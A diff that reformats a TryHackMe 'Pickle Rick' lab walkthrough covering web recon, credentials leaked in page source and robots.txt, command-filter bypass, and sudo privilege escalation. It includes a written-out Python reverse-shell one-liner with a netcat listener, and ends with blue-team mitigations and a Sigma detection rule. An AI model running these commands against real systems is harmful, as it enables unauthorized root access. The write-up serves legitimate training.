@@ -1,101 +1,124 @@
-# Pickle Rick – TryHackMe Walkthrough
+# Attack Simulation: Pickle Rick
 
-**Room**: [Pickle Rick](https://tryhackme.com/room/picklerick)  
-**Difficulty**: Easy  
-**Techniques**: Web recon, command injection, sudo misconfiguration, privilege escalation  
-**Date**: June 2026  
+## 1. Initial Scanning
 
----
-
-## 📸 Screenshots
-All screenshots are in [`screenshots/`](screenshots/) folder.
-
----
-
-## 🔴 Attack Chain
-
-### 1. Enumeration
 ```bash
 nmap -sV -sC -Pn 10.112.186.221
+```
+
 Open ports:
+- 22/tcp (SSH)
+- 80/tcp (HTTP)
 
-    22/tcp (SSH)
+Screenshot: nmap scan results
 
-    80/tcp (HTTP)
+## 2. Web Reconnaissance
 
-https://screenshots/1-nmap.png
-2. Web Reconnaissance
-
-Visited http://<IP> – Rick & Morty theme.
+Visited http://10.112.186.221 – Rick & Morty theme.
 
 View page source – found username in HTML comment:
+```html
 <!-- Username: R1ckRul3s -->
-https://screenshots/2-page-source-username.png
+```
+
+Screenshot: page source with username
 
 Robots.txt gave password:
+```bash
 curl http://10.112.186.221/robots.txt
 # Output: Wubbalubbadubdub
-https://screenshots/3-robots-txt-password.png
+```
+
+Screenshot: robots.txt password
 
 Directory brute force (gobuster):
+```bash
 gobuster dir -u http://10.112.186.221 -w /usr/share/wordlists/dirb/common.txt
-Discovered /login.php and /assets.
-https://screenshots/4-gobuster-dirs.png
-3. Login & Command Injection
+```
 
-Visited /login.php – used credentials:
+Discovered `/login.php` and `/assets`.
 
-    Username: R1ckRul3s
+Screenshot: gobuster directory brute force
 
-    Password: Wubbalubbadubdub
+## 3. Login & Command Injection
 
-https://screenshots/5-login-panel.png
+Visited `/login.php` – used credentials:
+- Username: R1ckRul3s
+- Password: Wubbalubbadubdub
+
+Screenshot: login panel
 
 The command panel allowed system commands.
 
-First attempt cat – blocked:
-https://screenshots/6-cat-disabled.png
+First attempt `cat` – blocked.
 
-Bypass using less:
+Screenshot: cat command disabled
+
+Bypass using `less`:
+```bash
 less Sup3rS3cretPickl3Ingred.txt
+```
+
 Got first flag.
-https://screenshots/7-less-working.png
-https://screenshots/8-first-flag.png
-4. Privilege Escalation
+
+Screenshot: less command working  
+Screenshot: first flag captured
+
+## 4. Privilege Escalation
 
 Checked sudo rights:
+```bash
 sudo -l
-Output: (ALL) NOPASSWD: ALL – can run any command as root without password.
-https://screenshots/9-sudo-l.png
+# Output: (ALL) NOPASSWD: ALL – can run any command as root without password
+```
 
-Second flag (inside /root):
+Screenshot: sudo privileges
+
+Second flag (inside `/root`):
+```bash
 sudo ls /root
 # Saw 2nd.txt
 sudo cat /root/2nd.txt
-If cat blocked, use sudo less /root/2nd.txt
-https://screenshots/13-second-flag.png
+# If cat blocked, use: sudo less /root/2nd.txt
+```
 
-Third flag (inside /home/rick – note space in filename):
+Screenshot: second flag
+
+Third flag (inside `/home/rick` – note space in filename):
+```bash
 sudo ls /home/rick
 # Saw: second ingredients
 sudo cat "/home/rick/second ingredients"
-https://screenshots/16-third-flag-final.png
-5. Reverse Shell (optional full control)
+```
+
+Screenshot: third flag (final)
+
+## 5. Reverse Shell (Optional Full Control)
 
 Started listener:
+```bash
 nc -lvnp 4444
-Python one-liner in command panel (replace <your_IP>):
+```
+
+Python one-liner in command panel (replace `<your_IP>`):
+```python
 sudo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
 Got root shell.
-🔵 Detection & Mitigation (Blue Team)
-Attack Step	Detection Method	Mitigation
-Command injection	WAF rules on |, ;, $(), python -c	Input validation, allowlist commands
-cat bypass with less	Monitor process execution (Sysmon Event ID 1)	Restrict available binaries in web shell
-sudo NOPASSWD: ALL	Audit logs: /var/log/auth.log	Never use NOPASSWD; restrict to specific commands
-Reverse shell	Network egress filtering on high ports; Sysmon network events	Block outbound ports (except needed)
-Sigma Rule Example (Reverse Shell)
 
+## Detection & Mitigation (Blue Team)
+
+| Attack Step | Detection Method | Mitigation |
+|-------------|------------------|------------|
+| Command injection | WAF rules on `|`, `;`, `$()`, `python -c` | Input validation, allowlist commands |
+| `cat` bypass with `less` | Monitor process execution (Sysmon Event ID 1) | Restrict available binaries in web shell |
+| `sudo NOPASSWD: ALL` | Audit logs: `/var/log/auth.log` | Never use NOPASSWD; restrict to specific commands |
+| Reverse shell | Network egress filtering on high ports; Sysmon network events | Block outbound ports (except needed) |
+
+### Sigma Rule Example (Reverse Shell)
+
+```yaml
 title: Suspicious Python Reverse Shell
 status: experimental
 logsource:
@@ -106,21 +129,21 @@ detection:
         Image|endswith: '/python3'
         CommandLine|contains: 'socket.socket'
     condition: selection
+```
 
-🏁 Flags (spoilers hidden)
-<details> <summary>Click to reveal</summary>
+## Flags (Spoilers Hidden)
 
-    Flag 1: flag{first_ingredient} (actual value varies per instance)
+<details>
+<summary>Click to reveal</summary>
 
-    Flag 2: flag{root_flag}
-
-    Flag 3: flag{third_rick_flag}
+- Flag 1: `flag{first_ingredient}` (actual value varies per instance)
+- Flag 2: `flag{root_flag}`
+- Flag 3: `flag{third_rick_flag}`
 
 </details>
-📚 References
 
-    TryHackMe Pickle Rick
+## References
 
-    GTFOBins – less
-
-    Linux Privilege Escalation – sudo
+- TryHackMe Pickle Rick
+- GTFOBins – less
+- Linux Privilege Escalation – sudo
